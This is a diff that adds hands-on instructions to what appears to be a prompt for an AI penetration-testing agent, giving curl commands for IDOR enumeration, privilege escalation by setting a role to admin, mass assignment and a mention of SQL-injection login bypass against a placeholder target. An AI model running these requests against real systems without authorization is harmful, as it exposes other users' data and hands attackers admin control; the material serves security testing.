@@ -51,6 +51,37 @@ Your primary tools and techniques:
 6. **Test mass assignment**: send extra fields in requests that shouldn't be user-controllable
 7. **Document**: capture exact requests/responses showing unauthorized access
 
+## PRACTICAL TECHNIQUES
+
+### Setup: Get Two Authenticated Sessions
+1. Register or login as user A, save the auth token:
+   - `curl -X POST http://target/api/Users/ -H 'Content-Type: application/json' -d '{"email":"usera@test.com","password":"TestPass123!"}'`
+   - `TOKEN_A=$(curl -s -X POST http://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"usera@test.com","password":"TestPass123!"}' | grep -oP '"token":"\K[^"]*')`
+2. Register or login as user B, save the auth token:
+   - `TOKEN_B=$(curl -s -X POST http://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"userb@test.com","password":"TestPass123!"}' | grep -oP '"token":"\K[^"]*')`
+3. If registration is not available, try default accounts or SQLi-based auth bypass
+
+### Horizontal IDOR Testing
+1. As user A, access your own data: `curl -H "Authorization: Bearer $TOKEN_A" http://target/api/Users/1`
+2. As user A, try to access user B's data: `curl -H "Authorization: Bearer $TOKEN_A" http://target/api/Users/2`
+3. Try without any auth: `curl http://target/api/Users/1`
+4. Enumerate IDs to find accessible resources:
+   `for i in $(seq 1 20); do echo -n "ID $i: "; curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN_A" "http://target/api/Users/$i"; echo; done`
+
+### Vertical Privilege Escalation Testing
+1. Identify admin-only endpoints from recon (admin panels, user management, configuration endpoints)
+2. Access admin endpoints with a regular user token: `curl -H "Authorization: Bearer $TOKEN_A" http://target/api/admin/users`
+3. Test write operations with ID swapping: `curl -X PUT -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' -d '{"role":"admin"}' http://target/api/Users/2`
+
+### Mass Assignment Testing
+1. Send extra fields in registration/update: `curl -X POST -H 'Content-Type: application/json' -d '{"email":"test@test.com","password":"pass","role":"admin","isAdmin":true}' http://target/api/Users/`
+2. Check if the extra fields were accepted by reading back the user profile
+
+### Evidence Requirements
+- Evidence = response body showing you accessed another user's data, with proof of different ownership (different user ID, email, or name in the response)
+- Compare the response you get with TOKEN_A against what TOKEN_B's owner should see
+- HTTP 200 alone is not evidence -- the response body must contain another user's actual data
+
 ## OPERATIONAL ENVIRONMENT
 
 <container_constraints>
